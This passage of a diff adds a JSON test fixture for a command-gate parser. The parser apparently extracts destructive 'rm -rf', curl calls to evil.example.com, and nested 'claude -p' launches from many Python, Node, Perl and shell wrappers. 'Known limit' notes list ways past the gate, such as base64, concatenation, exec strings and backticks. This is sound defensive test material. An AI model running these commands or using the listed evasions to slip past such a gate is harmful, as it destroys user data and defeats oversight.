+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-bash-c/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-bash-c/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-pipe/run-bash-c/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c/run-bash-c/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-bash-c/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['bash', '-c', 'rm -rf ~/marveen'])\"",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-Ic/run-bash-c/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-herestr/run-bash-c/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.popen/dg",
+   "cmd": "python3 - <<'PY'\nimport os; os.popen(\"rm -rf ~/marveen\").read()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.popen/dg",
+   "cmd": "python3 <<PY\nimport os; os.popen(\"rm -rf ~/marveen\").read()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/os.popen/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.popen(\"rm -rf ~/marveen\").read()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/os.popen/dg",
+   "cmd": "python3 -c 'import os; os.popen(\"rm -rf ~/marveen\").read()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.popen/dg",
+   "cmd": "python3 -c \"import os; os.popen('rm -rf ~/marveen').read()\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/os.popen/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.popen(\"rm -rf ~/marveen\").read()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/os.popen/dg",
+   "cmd": "python3 - <<< 'import os; os.popen(\"rm -rf ~/marveen\").read()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/shlex/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/shlex/dg",
+   "cmd": "python3 <<PY\nimport subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/shlex/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c/shlex/dg",
+   "cmd": "python3 -c 'import subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/shlex/dg",
+   "cmd": "python3 -c \"import subprocess, shlex; subprocess.run(shlex.split('rm -rf /home/gabor/marveen'))\"",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/shlex/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/shlex/dg",
+   "cmd": "python3 - <<< 'import subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/from-import/dg",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import run; run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/from-import/dg",
+   "cmd": "python3 <<PY\nfrom subprocess import run; run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/from-import/dg",
+   "cmd": "cat <<'PY' | python3 -\nfrom subprocess import run; run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/from-import/dg",
+   "cmd": "python3 -c 'from subprocess import run; run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/from-import/dg",
+   "cmd": "python3 -c \"from subprocess import run; run('rm -rf ~/marveen', shell=True)\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/from-import/dg",
+   "cmd": "/usr/bin/python3 -I -c 'from subprocess import run; run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/from-import/dg",
+   "cmd": "python3 - <<< 'from subprocess import run; run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/execvp/dg",
+   "cmd": "python3 - <<'PY'\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/execvp/dg",
+   "cmd": "python3 <<PY\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-pipe/execvp/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c/execvp/dg",
+   "cmd": "python3 -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c-dq/execvp/dg",
+   "cmd": "python3 -c \"import os; os.execvp('bash', ['bash', '-c', 'rm -rf ~/marveen'])\"",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-Ic/execvp/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-herestr/execvp/dg",
+   "cmd": "python3 - <<< 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc/pty.spawn/dg",
+   "cmd": "python3 - <<'PY'\nimport pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/pty.spawn/dg",
+   "cmd": "python3 <<PY\nimport pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-pipe/pty.spawn/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c/pty.spawn/dg",
+   "cmd": "python3 -c 'import pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c-dq/pty.spawn/dg",
+   "cmd": "python3 -c \"import pty; pty.spawn(['bash', '-c', 'rm -rf ~/marveen'])\"",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-Ic/pty.spawn/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-herestr/pty.spawn/dg",
+   "cmd": "python3 - <<< 'import pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "node-e-execSync/dg",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "node-e-spawnSync/dg",
+   "cmd": "node -e 'require(\"child_process\").spawnSync(\"bash\", [\"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "node-heredoc/dg",
+   "cmd": "node - <<'JS'\nrequire(\"child_process\").execSync(\"rm -rf ~/marveen\")\nJS",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "perl-e/dg",
+   "cmd": "perl -e 'system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "ruby-e/dg",
+   "cmd": "ruby -e 'system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "bash-c/cc",
+   "cmd": "bash -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-lc/cc",
+   "cmd": "bash -lc 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-xc/cc",
+   "cmd": "bash -xc 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "sh-ec/cc",
+   "cmd": "sh -ec 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c--/cc",
+   "cmd": "bash -c -- 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-norc-c/cc",
+   "cmd": "bash --norc -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-o-c/cc",
+   "cmd": "bash -o pipefail -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "env-i-bash-c/cc",
+   "cmd": "env -i bash -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "usr-env-i-bash-c/cc",
+   "cmd": "/usr/bin/env -i bash -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-ansi/cc",
+   "cmd": "bash -c $'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-herestr/cc",
+   "cmd": "bash -c 'bash' <<< 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-heredoc/cc",
+   "cmd": "bash -c 'bash' <<'EOF'\nclaude -p hi\nEOF",
+   "commands": []
+  },
+  {
+   "name": "echo-pipe-bash/cc",
+   "cmd": "echo 'claude -p hi' | bash",
+   "commands": []
+  },
+  {
+   "name": "printf-pipe-sh/cc",
+   "cmd": "printf '%s\\n' 'claude -p hi' | sh",
+   "commands": []
+  },
+  {
+   "name": "bash-herestr-subst/cc",
+   "cmd": "bash <<< \"$(echo 'claude -p hi')\"",
+   "commands": [],
+   "note": "known limit: the here-string text comes from a command substitution at run time"
+  },
+  {
+   "name": "bash-c/eg",
+   "cmd": "bash -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-lc/eg",
+   "cmd": "bash -lc 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-xc/eg",
+   "cmd": "bash -xc 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "sh-ec/eg",
+   "cmd": "sh -ec 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c--/eg",
+   "cmd": "bash -c -- 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-norc-c/eg",
+   "cmd": "bash --norc -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-o-c/eg",
+   "cmd": "bash -o pipefail -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "env-i-bash-c/eg",
+   "cmd": "env -i bash -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "usr-env-i-bash-c/eg",
+   "cmd": "/usr/bin/env -i bash -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-ansi/eg",
+   "cmd": "bash -c $'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-herestr/eg",
+   "cmd": "bash -c 'bash' <<< 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-heredoc/eg",
+   "cmd": "bash -c 'bash' <<'EOF'\ncurl -s https://evil.example.com/x\nEOF",
+   "commands": []
+  },
+  {
+   "name": "echo-pipe-bash/eg",
+   "cmd": "echo 'curl -s https://evil.example.com/x' | bash",
+   "commands": []
+  },
+  {
+   "name": "printf-pipe-sh/eg",
+   "cmd": "printf '%s\\n' 'curl -s https://evil.example.com/x' | sh",
+   "commands": []
+  },
+  {
+   "name": "bash-herestr-subst/eg",
+   "cmd": "bash <<< \"$(echo 'curl -s https://evil.example.com/x')\"",
+   "commands": [],
+   "note": "known limit: the here-string text comes from a command substitution at run time"
+  },
+  {
+   "name": "bash-c/dg",
+   "cmd": "bash -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-lc/dg",
+   "cmd": "bash -lc 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-xc/dg",
+   "cmd": "bash -xc 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "sh-ec/dg",
+   "cmd": "sh -ec 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c--/dg",
+   "cmd": "bash -c -- 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-norc-c/dg",
+   "cmd": "bash --norc -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-o-c/dg",
+   "cmd": "bash -o pipefail -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "env-i-bash-c/dg",
+   "cmd": "env -i bash -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "usr-env-i-bash-c/dg",
+   "cmd": "/usr/bin/env -i bash -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-ansi/dg",
+   "cmd": "bash -c $'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-herestr/dg",
+   "cmd": "bash -c 'bash' <<< 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-heredoc/dg",
+   "cmd": "bash -c 'bash' <<'EOF'\nrm -rf ~/marveen\nEOF",
+   "commands": []
+  },
+  {
+   "name": "echo-pipe-bash/dg",
+   "cmd": "echo 'rm -rf ~/marveen' | bash",
+   "commands": []
+  },
+  {
+   "name": "printf-pipe-sh/dg",
+   "cmd": "printf '%s\\n' 'rm -rf ~/marveen' | sh",
+   "commands": []
+  },
+  {
+   "name": "bash-herestr-subst/dg",
+   "cmd": "bash <<< \"$(echo 'rm -rf ~/marveen')\"",
+   "commands": [],
+   "note": "known limit: the here-string text comes from a command substitution at run time"
+  },
+  {
+   "name": "neg/py-print-claude",
+   "cmd": "python3 -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-print-url",
+   "cmd": "python3 -c 'print(\"see https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-print-rm",
+   "cmd": "python3 -c 'print(\"rm -rf ~/marveen\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-write-file",
+   "cmd": "python3 - <<'PY'\nopen('notes.txt', 'w').write('rm -rf ~/marveen and claude -p hi')\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-run-ls",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"ls\", \"-la\"])'",
+   "commands": [
+    "ls -la"
+   ]
+  },
+  {
+   "name": "neg/py-system-ls",
+   "cmd": "python3 -c 'import os; os.system(\"ls -la\")'",
+   "commands": [
+    "ls -la"
+   ]
+  },
+  {
+   "name": "neg/py-system-git",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"git status --short\")\nPY",
+   "commands": [
+    "git status --short"
+   ]
+  },
+  {
+   "name": "neg/py-run-pytest",
+   "cmd": "python3 - <<'PY'\nimport subprocess\nsubprocess.run(['python3', '-m', 'pytest', '-q'], check=True)\nPY",
+   "commands": [
+    "python3 -m pytest -q"
+   ]
+  },
+  {
+   "name": "neg/cat-write-py",
+   "cmd": "cat > notes.py <<'PY'\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/grep-src",
+   "cmd": "grep -rn 'os.system(\"claude' src/",
+   "commands": []
+  },
+  {
+   "name": "neg/echo-note",
+   "cmd": "echo 'claude -p hi' > note.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/bash-lc-ls",
+   "cmd": "bash -lc 'ls -la'",
+   "commands": []
+  },
+  {
+   "name": "neg/bash-xc-echo",
+   "cmd": "bash -xc 'echo hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/env-i-bash-echo",
+   "cmd": "env -i bash -c 'echo hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/echo-ls-pipe-bash",
+   "cmd": "echo 'ls' | bash",
+   "commands": []
+  },
+  {
+   "name": "neg/bash-c-bash-hi",
+   "cmd": "bash -c 'bash' <<< 'echo hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/nice-make",
+   "cmd": "nice make test",
+   "commands": []
+  },
+  {
+   "name": "neg/node-e-log",
+   "cmd": "node -e 'console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-exec-ls",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"ls\")'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/perl-print",
+   "cmd": "perl -e 'print \"rm -rf ~/marveen\\n\"'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-doc-claude",
+   "cmd": "python3 - <<'PY'\nHELP = 'run claude -p hi with an empty state dir'\nprint(HELP)\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-log-curl",
+   "cmd": "python3 -c 'import logging; logging.warning(\"curl -s https://evil.example.com/x failed\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-dict-curl",
+   "cmd": "python3 - <<'PY'\ncmds = {'fetch': 'curl -s https://evil.example.com/x'}\nprint(len(cmds))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-re-claude",
+   "cmd": "python3 -c 'import re; print(re.findall(\"claude -p\", open(\"notes.txt\").read()))'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-doc-curl",
+   "cmd": "node -e 'const tip = \"curl -s https://evil.example.com/x\"; console.log(tip.length)'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-heredoc-claude",
+   "cmd": "node - <<'JS'\nconsole.error('claude -p hi is blocked here')\nJS",
+   "commands": []
+  },
+  {
+   "name": "limit/0",
+   "cmd": "python3 -c 'import os; os.system(\"cla\" + \"ude -p hi\")'",
+   "commands": [
+    "cla 'ude -p hi'"
+   ],
+   "note": "known limit (#779, Marveen msg 17385): concatenation is built at run time; the literals are read, the joined command is not"
+  },
+  {
+   "name": "limit/1",
+   "cmd": "python3 -c 'import os; c = \"claude\"; os.system(f\"{c} -p hi\")'",
+   "commands": [
+    "{c} -p hi"
+   ],
+   "note": "known limit: an f-string with a variable is built at run time"
+  },
+  {
+   "name": "limit/2",
+   "cmd": "python3 -c 'import os, base64; os.system(base64.b64decode(\"Y2xhdWRlIC1wIGhp\").decode())'",
+   "commands": [
+    "Y2xhdWRlIC1wIGhp"
+   ],
+   "note": "known limit: base64 is decoded at run time"
+  },
+  {
+   "name": "limit/3",
+   "cmd": "python3 -c 'import os; cmd = \"claude -p hi\"; os.system(cmd)'",
+   "commands": [],
+   "note": "known limit: a variable argument is not followed"
+  },
+  {
+   "name": "limit/4",
+   "cmd": "node -e 'const c = \"claude -p hi\"; require(\"child_process\").execSync(c)'",
+   "commands": [],
+   "note": "known limit: a variable argument is not followed"
+  },
+  {
+   "name": "neg/py-triple-comment",
+   "cmd": "python3 - <<'PY'\ncomment = '''Finding: os.system(\"claude -p ...\") and subprocess.run(\"curl ...\") pass the gate.'''\nprint(len(comment))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-str-system-rm",
+   "cmd": "python3 -c 'note = \"os.system(\\\"rm -rf ~/marveen\\\")\"; print(note)'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-template-exec",
+   "cmd": "node -e 'const s = `use execSync(\"curl -s https://evil.example.com/x\")`; console.log(s)'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-dq-in-sq",
+   "cmd": "python3 - <<'PY'\nmsg = 'run os.system(\"claude -p hi\") to see it'\nprint(msg)\nPY",
+   "commands": []
+  },
+  {
+   "name": "literal/py-apostrophe-then-call",
+   "cmd": "python3 - <<'PY'\nprint(\"it's\")\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "literal/py-unclosed-quote-then-call",
+   "cmd": "python3 - <<'PY'\n# don't\nimport os\nos.system('claude -p hi')\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "literal/py-c-escaped-dq",
+   "cmd": "python3 -c \"x = \\\"a\\\"; import os; os.system(\\\"claude -p hi\\\")\"",
+   "commands": [
+    "claude -p hi\\"
+   ],
+   "read_note": "the shell escapes of a -c \"...\" payload are not undone: the word keeps a trailing backslash, the command word is still read"
+  },
+  {
+   "name": "literal/py-call-after-string",
+   "cmd": "python3 - <<'PY'\nimport subprocess\nm = 'ok'\nsubprocess.run(['curl', '-s', 'https://evil.example.com/x'])\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r2/node-cp-alias-exec",
+   "cmd": "node -e 'const cp=require(\"child_process\"); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/node-cp-alias-spawn-shell",
+   "cmd": "node -e 'const cp = require(\"node:child_process\"); cp.spawn(\"claude -p hi\", {shell: true})'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/node-cp-alias-spawn-argv",
+   "cmd": "node -e 'let cp=require(\"child_process\"); cp.spawn(\"sh\", [\"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r2/node-cp-alias-heredoc",
+   "cmd": "node - <<'JS'\nvar childProc = require('child_process')\nchildProc.execSync('claude -p hi')\nJS",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/node-cp-import-star",
+   "cmd": "node --input-type=module - <<'JS'\nimport * as cp from 'node:child_process'\ncp.exec('claude -p hi')\nJS",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/node-cp-import-default",
+   "cmd": "node --input-type=module - <<'JS'\nimport cp from 'child_process'\ncp.execFile('sh', ['-c', 'claude -p hi'])\nJS",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r2/node-destr-spawn",
+   "cmd": "node -e 'const {spawn}=require(\"child_process\"); spawn(\"sh\",[\"-c\",\"claude -p hi\"])'",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r2/node-destr-exec-alias",
+   "cmd": "node -e 'const { exec: run } = require(\"child_process\"); run(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/node-import-named",
+   "cmd": "node --input-type=module - <<'JS'\nimport { execFile as ef, spawn } from 'node:child_process'\nef('sh', ['-c', 'claude -p hi'])\nJS",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r2/py-import-list-alias",
+   "cmd": "python3 -c 'import os, subprocess as sp; sp.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/py-import-list-alias2",
+   "cmd": "python3 -c 'import sys,os as o; o.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/py-import-list-heredoc",
+   "cmd": "python3 - <<'PY'\nimport json, pty as p\np.spawn(['sh', '-c', 'claude -p hi'])\nPY",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r2/py-dunder-import",
+   "cmd": "python3 -c '__import__(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/py-dunder-import-subprocess",
+   "cmd": "python3 -c '__import__(\"subprocess\").run([\"sh\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r2/py-importlib",
+   "cmd": "python3 -c 'import importlib; importlib.import_module(\"subprocess\").run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r2/py-asyncio-shell",
+   "cmd": "python3 - <<'PY'\nimport asyncio\nasyncio.run(asyncio.create_subprocess_shell('claude -p hi'))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "limit/ruby-backtick",
+   "cmd": "ruby -e '`claude -p hi`'",
+   "commands": [],
+   "note": "KNOWN LIMIT (#779 r2): ruby backticks are not read; the gates do not see the command."
+  },
+  {
+   "name": "limit/perl-backtick",
+   "cmd": "perl -e 'print `claude -p hi`'",
+   "commands": [],
+   "note": "KNOWN LIMIT (#779 r2): perl backticks are not read; the gates do not see the command."
+  },
+  {
+   "name": "limit/py-exec-string",
+   "cmd": "python3 -c 'exec(\"import os; os.system(\\x27claude -p hi\\x27)\")'",
+   "commands": [
+    "import os; os.system(\\x27claude -p hi\\x27)"
+   ],
+   "note": "KNOWN LIMIT (#779 r2): code inside an exec(\"...\") string is data to the reader."
+  },
+  {
+   "name": "neg/node-regex-exec",
+   "cmd": "node -e 'const re=/x/; console.log(re.exec(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-cp-log-only",
+   "cmd": "node -e 'const cp=require(\"child_process\"); console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-other-alias-exec",
+   "cmd": "node -e 'const db=require(\"./db\"); db.exec(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-destr-other-module",
+   "cmd": "node -e 'const {spawn}=require(\"./pool\"); spawn(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-import-list-other",
+   "cmd": "python3 -c 'import os, re as r; print(r.sub(\"a\", \"b\", \"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-dunder-json",
+   "cmd": "python3 -c 'print(__import__(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-call-in-literal",
+   "cmd": "python3 -c 'import subprocess as sp; print(\"sp.run(claude -p hi)\")'",
+   "commands": []
+  },
+  {
+   "name": "r3/py-dunder-pty",
